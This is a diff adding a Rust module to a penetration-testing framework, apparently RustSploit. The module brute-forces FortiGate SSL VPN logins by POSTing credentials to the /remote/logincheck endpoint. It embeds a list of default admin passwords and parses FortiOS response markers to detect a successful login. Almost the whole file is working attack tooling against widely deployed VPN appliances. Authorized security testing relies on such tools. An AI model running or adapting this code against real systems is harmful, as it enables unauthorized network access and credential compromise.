@@ -1,0 +1,134 @@
+//! Fortinet FortiGate SSL VPN credential probe via the `/remote/logincheck`
+//! POST endpoint.
+
+use crate::module::{ModuleCtx, ModuleOutcome};
+use anyhow::{Context, Result};
+use std::time::Duration;
+
+use crate::module_info::{ModuleInfo, ModuleRank};
+use crate::utils::LoginResult;
+use crate::utils::creds_helper::{self, CredsRun};
+use crate::utils::network::{HttpClientOpts, build_http_client_with};
+
+const DEFAULT_PORT: u16 = 443;
+
+const DEFAULTS: &[(&str, &str)] = &[
+    ("admin", ""),
+    ("admin", "admin"),
+    ("admin", "password"),
+    ("admin", "fortinet"),
+    ("admin", "fortigate"),
+    ("admin", "12345"),
+];
+
+pub fn info() -> ModuleInfo {
+    ModuleInfo {
+        name: "Fortinet SSL VPN Bruteforce".to_string(),
+        description:
+            "POSTs `username=&secretkey=` to /remote/logincheck on a FortiGate SSL VPN portal \
+             and inspects the response body for the redirect / error markers. Single-target — \
+             scheduler does fan-out."
+                .to_string(),
+        authors: vec!["RustSploit Contributors".to_string()],
+        references: vec![],
+        disclosure_date: None,
+        rank: ModuleRank::Normal,
+        default_port: Some(443),
+    }
+}
+
+pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
+    let target = ctx
+        .target
+        .as_single()
+        .context("fortinet_bruteforce requires a single-host target")?;
+    creds_helper::run(
+        target,
+        CredsRun {
+            service_name: "fortinet_sslvpn",
+            default_port: DEFAULT_PORT,
+            source_module: "creds/generic/fortinet_bruteforce",
+            defaults: DEFAULTS,
+            password_only: false,
+        },
+        |host, port, user, pass, timeout| async move { probe(&host, port, &user, &pass, timeout).await },
+    )
+    .await
+}
+
+async fn probe(host: &str, port: u16, user: &str, pass: &str, timeout: Duration) -> LoginResult {
+    let opts = HttpClientOpts::permissive();
+    let client = match build_http_client_with(timeout, opts) {
+        Ok(c) => c,
+        Err(e) => {
+            return LoginResult::Error {
+                message: format!("http client: {e}"),
+                retryable: false,
+            };
+        }
+    };
+    let url = format!("https://{}:{}/remote/logincheck", host, port);
+    let body = format!(
+        "username={}&secretkey={}&ajax=1",
+        crate::utils::url_encode(user),
+        crate::utils::url_encode(pass)
+    );
+    let resp = client
+        .post(&url)
+        .header("Content-Type", "application/x-www-form-urlencoded")
+        .body(body)
+        .send()
+        .await;
+    let resp = match resp {
+        Ok(r) => r,
+        Err(e) => {
+            return LoginResult::Error {
+                message: format!("post: {e}"),
+                retryable: e.is_timeout() || e.is_connect(),
+            };
+        }
+    };
+    let status = resp.status().as_u16();
+    // Cap the body we buffer: the logincheck response is tiny, but a hostile
+    // or misbehaving endpoint on :443 could stream an unbounded body. Reading
+    // the raw bytes with a sane cap avoids an OOM, and we only ever inspect a
+    // short prefix below.
+    const MAX_BODY: usize = 64 * 1024;
+    let bytes = match crate::utils::safe_io::read_http_body_capped(
+        resp,
+        crate::utils::safe_io::DEFAULT_BODY_CAP,
+    )
+    .await
+    {
+        Ok(b) => b,
+        Err(e) => {
+            return LoginResult::Error {
+                message: format!("read body: {e}"),
+                retryable: true,
+            };
+        }
+    };
+    let capped = &bytes[..bytes.len().min(MAX_BODY)];
+    let txt = String::from_utf8_lossy(capped).into_owned();
+    // FortiOS replies with `ret=1,...` on success and `ret=0,error=...` on
+    // failure. SAML / 2FA replies start with `redir=`.
+    if txt.starts_with("ret=1") || txt.contains("redir=/sslvpn/") {
+        LoginResult::Success
+    } else if txt.starts_with("ret=0") || status == 401 || status == 403 {
+        LoginResult::AuthFailed
+    } else {
+        LoginResult::Error {
+            message: format!(
+                "unexpected response status={status} body={}",
+                txt.chars().take(80).collect::<String>()
+            ),
+            retryable: false,
+        }
+    }
+}
+
+crate::register_native_module!(
+    crate::module::Category::Creds,
+    "generic/fortinet_bruteforce",
+    native
+);
